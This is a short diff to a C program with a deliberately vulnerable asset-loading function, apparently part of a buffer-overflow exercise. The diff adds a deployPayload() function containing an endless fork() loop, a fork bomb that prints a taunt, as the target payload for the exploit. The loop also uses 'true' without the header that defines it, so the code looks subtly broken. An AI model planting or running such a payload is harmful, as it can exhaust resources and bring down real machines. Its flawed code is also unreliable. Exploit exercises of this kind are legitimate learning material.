@@ -1,6 +1,8 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
 
 void loadAsset(char filename[], uint8_t assetBuffer[]) { // vulnerable dummy function
     FILE *filePointer = fopen(filename, "rb");
@@ -17,6 +19,13 @@ char* getTextFromAsset(uint8_t *asset) {
     }
     text[20] = 0; // so printf knows when to stop
     return text;
+}
+
+void deployPayload() { // couldn't trace down where the buffer is on the stack so just building in a function with the payload
+    while(true) {
+        fork();
+        puts("Get fork bombed loser");
+    }
 }
 
 int main() {
